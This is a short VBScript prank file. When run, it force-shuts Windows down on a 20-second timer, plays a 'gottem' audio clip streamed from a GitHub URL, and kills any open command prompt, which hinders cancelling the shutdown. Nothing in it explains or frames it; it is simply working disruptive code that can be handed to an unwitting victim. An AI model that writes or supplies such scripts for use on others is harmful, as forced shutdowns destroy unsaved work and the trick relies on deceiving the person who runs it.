Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "C:\WINDOWS\system32\shutdown.exe /s /f /t 20 /c "" """
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
oPlayer.URL = "https://raw.githubusercontent.com/p6c/a/main/gottem.mp3"
oPlayer.controls.play
objShell.Run "C:\WINDOWS\system32\taskkill.exe /im cmd.exe"
While oPlayer.playState <> 1 ' 1 = Stopped
  WScript.Sleep 100
Wend

' Release the audio file
oPlayer.close